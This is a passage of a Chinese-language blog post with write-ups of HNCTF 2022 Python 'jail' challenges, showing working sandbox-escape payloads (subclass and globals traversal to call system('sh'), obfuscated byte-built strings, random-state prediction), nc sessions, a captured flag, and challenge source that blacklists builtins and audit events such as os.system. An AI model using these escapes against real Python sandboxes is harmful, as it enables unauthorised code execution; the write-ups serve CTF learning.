class="number">32</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">102</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">108</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">97</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">103</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">95</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">121</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">48</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">117</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">95</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">67</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">97</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">78</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">95</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">70</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">105</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">78</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">100</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">95</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">109</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">69</span>]))).decode())</span><br></pre></td></tr></table></figure>
+
+<p>或者说上一题的方法二直接打即可</p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 26555</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _   _                _ _  _   ____</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || | |___ \</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/</span><br><span class="line">                                                                                                                        </span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;</span>,+ Good luck!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ez,找bytes类索引的方法还是没被ban，所以上上题的方法还是可以打</p>
+<p>这里补充一种新的方法</p>
+<blockquote>
+<p>list(dict(system&#x3D;114514))[0]可以获取system这个字符串<br>那么我们不用传统方法而使用这种方法构造出system和sh就简单很多了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">list</span>(<span class="built_in">dict</span>(system=<span class="number">1</span>))[<span class="number">0</span>]](<span class="built_in">list</span>(<span class="built_in">dict</span>(sh=<span class="number">1</span>))[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 20449</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _ _                _ _____</span><br><span class="line"> | |              (_)                         (_)     (_) | |              | | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">It<span class="string">&#x27;s so easy challenge!</span></span><br><span class="line"><span class="string">Seems flag into the dir()</span></span><br><span class="line"><span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提示说要用dir()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 20449</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _ _                _ _____</span><br><span class="line"> | |              (_)                         (_)     (_) | |              | | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">It<span class="string">&#x27;s so easy challenge!</span></span><br><span class="line"><span class="string">Seems flag into the dir()</span></span><br><span class="line"><span class="string">&gt; dir()</span></span><br><span class="line"><span class="string">[&#x27;</span>__builtins__<span class="string">&#x27;, &#x27;</span>my_flag<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└─$ nc node5.anna.nssctf.cn 20449</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ _____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span></span><br><span class="line"><span class="string"> | &#x27;</span>_ \ / _ \/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _ \ <span class="string">&#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s so easy challenge!</span><br><span class="line">Seems flag into the <span class="built_in">dir</span>()</span><br><span class="line">&gt; <span class="built_in">dir</span>(my_flag)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;flag_level5&#x27;</span>]</span><br><span class="line"></span><br><span class="line">└─$ nc node5.anna.nssctf.cn 20449</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _ _                _ _____</span><br><span class="line"> | |              (_)                         (_)     (_) | |              | | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">It<span class="string">&#x27;s so easy challenge!</span></span><br><span class="line"><span class="string">Seems flag into the dir()</span></span><br><span class="line"><span class="string">&gt; dir(my_flag.flag_level5)</span></span><br><span class="line"><span class="string">[&#x27;</span>__add__<span class="string">&#x27;, &#x27;</span>__class__<span class="string">&#x27;, &#x27;</span>__contains__<span class="string">&#x27;, &#x27;</span>__delattr__<span class="string">&#x27;, &#x27;</span>__dict__<span class="string">&#x27;, &#x27;</span>__dir__<span class="string">&#x27;, &#x27;</span>__doc__<span class="string">&#x27;, &#x27;</span>__eq__<span class="string">&#x27;, &#x27;</span>__format__<span class="string">&#x27;, &#x27;</span>__ge__<span class="string">&#x27;, &#x27;</span>__getattribute__<span class="string">&#x27;, &#x27;</span>__getitem__<span class="string">&#x27;, &#x27;</span>__getnewargs__<span class="string">&#x27;, &#x27;</span>__gt__<span class="string">&#x27;, &#x27;</span>__hash__<span class="string">&#x27;, &#x27;</span>__init__<span class="string">&#x27;, &#x27;</span>__init_subclass__<span class="string">&#x27;, &#x27;</span>__iter__<span class="string">&#x27;, &#x27;</span>__le__<span class="string">&#x27;, &#x27;</span>__len__<span class="string">&#x27;, &#x27;</span>__lt__<span class="string">&#x27;, &#x27;</span>__mod__<span class="string">&#x27;, &#x27;</span>__module__<span class="string">&#x27;, &#x27;</span>__mul__<span class="string">&#x27;, &#x27;</span>__ne__<span class="string">&#x27;, &#x27;</span>__new__<span class="string">&#x27;, &#x27;</span>__reduce__<span class="string">&#x27;, &#x27;</span>__reduce_ex__<span class="string">&#x27;, &#x27;</span>__repr__<span class="string">&#x27;, &#x27;</span>__rmod__<span class="string">&#x27;, &#x27;</span>__rmul__<span class="string">&#x27;, &#x27;</span>__setattr__<span class="string">&#x27;, &#x27;</span>__sizeof__<span class="string">&#x27;, &#x27;</span>__str__<span class="string">&#x27;, &#x27;</span>__subclasshook__<span class="string">&#x27;, &#x27;</span>__weakref__<span class="string">&#x27;, &#x27;</span>capitalize<span class="string">&#x27;, &#x27;</span>casefold<span class="string">&#x27;, &#x27;</span>center<span class="string">&#x27;, &#x27;</span>count<span class="string">&#x27;, &#x27;</span>encode<span class="string">&#x27;, &#x27;</span>endswith<span class="string">&#x27;, &#x27;</span>expandtabs<span class="string">&#x27;, &#x27;</span>find<span class="string">&#x27;, &#x27;</span>format<span class="string">&#x27;, &#x27;</span>format_map<span class="string">&#x27;, &#x27;</span>index<span class="string">&#x27;, &#x27;</span>isalnum<span class="string">&#x27;, &#x27;</span>isalpha<span class="string">&#x27;, &#x27;</span>isascii<span class="string">&#x27;, &#x27;</span>isdecimal<span class="string">&#x27;, &#x27;</span>isdigit<span class="string">&#x27;, &#x27;</span>isidentifier<span class="string">&#x27;, &#x27;</span>islower<span class="string">&#x27;, &#x27;</span>isnumeric<span class="string">&#x27;, &#x27;</span>isprintable<span class="string">&#x27;, &#x27;</span>isspace<span class="string">&#x27;, &#x27;</span>istitle<span class="string">&#x27;, &#x27;</span>isupper<span class="string">&#x27;, &#x27;</span><span class="built_in">join</span><span class="string">&#x27;, &#x27;</span>ljust<span class="string">&#x27;, &#x27;</span>lower<span class="string">&#x27;, &#x27;</span>lstrip<span class="string">&#x27;, &#x27;</span>maketrans<span class="string">&#x27;, &#x27;</span>partition<span class="string">&#x27;, &#x27;</span>removeprefix<span class="string">&#x27;, &#x27;</span>removesuffix<span class="string">&#x27;, &#x27;</span>replace<span class="string">&#x27;, &#x27;</span>rfind<span class="string">&#x27;, &#x27;</span>rindex<span class="string">&#x27;, &#x27;</span>rjust<span class="string">&#x27;, &#x27;</span>rpartition<span class="string">&#x27;, &#x27;</span>rsplit<span class="string">&#x27;, &#x27;</span>rstrip<span class="string">&#x27;, &#x27;</span><span class="built_in">split</span><span class="string">&#x27;, &#x27;</span>splitlines<span class="string">&#x27;, &#x27;</span>startswith<span class="string">&#x27;, &#x27;</span>strip<span class="string">&#x27;, &#x27;</span>swapcase<span class="string">&#x27;, &#x27;</span>title<span class="string">&#x27;, &#x27;</span>translate<span class="string">&#x27;, &#x27;</span>upper<span class="string">&#x27;, &#x27;</span>zfill<span class="string">&#x27;]</span></span><br></pre></td></tr></table></figure>
+<p>包含这么多类与方法，应该是一个字符串，那找找有没有可以直接输出的方法<br>一直跟进之后发现在my_flag.flag_level5中包含了encode方法<br>那就直接输出吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 20449</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _ _                _ _____</span><br><span class="line"> | |              (_)                         (_)     (_) | |              | | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">It<span class="string">&#x27;s so easy challenge!</span></span><br><span class="line"><span class="string">Seems flag into the dir()</span></span><br><span class="line"><span class="string">&gt; my_flag.flag_level5.encode()</span></span><br><span class="line"><span class="string">b&#x27;</span>flag=NSSCTF&#123;b5398491-43f7-413b-a104-c82b0598dcd4&#125;\n<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</h2><p>方法和上一题一样</p>
+<h2 id="HNCTF-2022-WEEK2-laKe-laKe-laKe-JAIL"><a href="#HNCTF-2022-WEEK2-laKe-laKe-laKe-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)"></a>[HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)</h2><p>看看源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#You finsih these two challenge of leak</span></span><br><span class="line"><span class="comment">#So cool</span></span><br><span class="line"><span class="comment">#Now it&#x27;s time for laKe!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line">WELCOME=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _  __      _       _  __      _       _  __    </span></span><br><span class="line"><span class="string"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span></span><br><span class="line"><span class="string"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span></span><br><span class="line"><span class="string"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span></span><br><span class="line"><span class="string"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span></span><br><span class="line"><span class="string">                                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(open_func(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>有意思，建了一个审计钩子，意图检测并禁止若干审计事件</p>
+<p>这里得要搞定random才行，我不太懂，看看wp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[rnd:=<span class="built_in">__import__</span>(<span class="string">&#x27;random&#x27;</span>),</span><br><span class="line"> state:=<span class="built_in">list</span>(rnd.getstate()[<span class="number">1</span>][:-<span class="number">1</span>]),</span><br><span class="line"> state_:=(<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>),</span><br><span class="line"> rnd.setstate(state_),</span><br><span class="line"> rnd.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)][-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<p>数是random.randint生成的，所以只要拿到random的state就能还原出这个数</p>
+<p>然后我们需要去搞定state，这里用海象表达式搞出来了多行输入，但是后面的原理还是不太明白，具体的等稍后再去分析</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%93%E9%A2%98%E5%BC%BA%E5%8C%96%E7%BB%83/" rel="tag"># 专题强化练</a>
+              <a href="/tags/pyjail/" rel="tag"># pyjail</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/08/06/Done-Nodejs%E4%BB%A5%E5%8F%8A%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%9F%A5%E8%AF%86/" rel="prev" title="Nodejs以及原型链的知识">
+      <i class="fa fa-chevron-left"></i> Nodejs以及原型链的知识
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/08/12/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/" rel="next" title="phar反序列化进阶">
+      phar反序列化进阶 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
